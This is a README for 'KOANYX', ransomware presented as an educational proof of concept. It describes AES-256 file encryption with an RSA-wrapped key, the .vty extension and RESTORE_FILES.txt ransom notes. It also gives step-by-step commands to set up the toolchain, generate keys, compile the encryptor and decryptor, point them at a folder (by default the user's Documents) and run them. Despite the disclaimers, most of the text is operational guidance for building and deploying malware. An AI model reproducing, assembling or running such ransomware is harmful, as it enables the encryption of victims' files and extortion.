 KOANYX Ransomware (Educational Purpose Only)
 IMPORTANT DISCLAIMER: This project is for EDUCATIONAL PURPOSES ONLY

This code demonstrates how ransomware works to help cybersecurity professionals and students understand attack vectors and develop better defenses. Never use this against systems you don't own or without explicit permission.

 Overview
KOANYX is a proof-of-concept ransomware that demonstrates file encryption using AES-256 and RSA-2048. It's designed to run in controlled environments like virtual machines for educational purposes.

 How It Works
Generates a random 256-bit AES key

Encrypts all files in the target directory with AES-256

Appends .vty extension to encrypted files

Creates ransom notes (RESTORE_FILES.txt) in every directory

Protects the AES key with RSA-2048 public key encryption

Saves the encrypted key as encrypted_aes_key.bin

 Prerequisites
Windows OS (for testing in VM)

MSYS2 64-bit installed to C:\msys64

OpenSSL for MSYS2

 Installation & Setup
Step 1: Install MSYS2
bash
# Download and install from https://www.msys2.org/
# Open "MSYS2 MINGW64" terminal and update:
pacman -Syu
Step 2: Install OpenSSL
bash
pacman -S mingw-w64-x86_64-openssl
Step 3: Generate RSA Key Pair
bash
# Navigate to your working directory
cd /c/YourFolder

# Generate private key (no password - just press Enter)
openssl genrsa -out private_key.pem 2048

# Generate public key
openssl rsa -in private_key.pem -pubout -out public_key.pem
Step 4: Compile the Programs
bash
# Compile encryptor
gcc encryptor.c -o encryptor.exe -lcrypt32 -lws2_32

# Compile decryptor  
gcc decryptor.c -o decryptor.exe -lcrypt32 -lws2_32
 Configuration
Set Target Directory (encryptor.c)
c
int main() {
    printBanner();
    // Change this to your target folder
    const char* targetPath = "C:\\Users\\YourName\\Documents";
    
    // Examples:
    // const char* targetPath = "C:\\RansomTest";      // Specific folder
    // const char* targetPath = "D:\\Projects";        // Different drive
    // const char* targetPath = ".\\test_files";       // Current directory
Set Target Directory (decryptor.c)
c
int main() {
    printBanner();
    // Change this to where encrypted files are located
    const char* targetPath = "C:\\Users\\YourName\\Documents";
    
    BYTE* aesKey = decryptAES("C:\\encrypted_aes_key.bin", 
                              "C:\\private_key.pem", &aesKeyLen);
 File Structure Requirements
Before Encryption
text
C:\
├── public_key.pem    ← Required for encryption
└── encryptor.exe
After Encryption
text
C:\
├── encrypted_aes_key.bin    ← Created during encryption
├── (your files with .vty extension)
└── RESTORE_FILES.txt         ← Ransom notes
Before Decryption
text
C:\
├── private_key.pem           ← Required for decryption
├── encrypted_aes_key.bin     ← From encryption phase
└── decryptor.exe
🖥️ Usage
Run Encryptor
bash
./encryptor.exe
This encrypts all files in the target directory and creates ransom notes.

Run Decryptor
bash
./decryptor.exe
This decrypts all .vty files and restores the originals.

 Security Notice
This code is provided STRICTLY FOR EDUCATIONAL PURPOSES:

 Use in isolated virtual machines only

 Learn how ransomware works to defend against it

 Understand encryption mechanisms

 Never deploy on real systems

 Never use for malicious purposes

 Learning Objectives
Understand AES-256 symmetric encryption

Learn RSA asymmetric encryption implementation

Study ransomware behavior patterns

Develop better cybersecurity defense strategies

📝 License
This project is for educational purposes only. The author assumes no liability for misuse of this code.
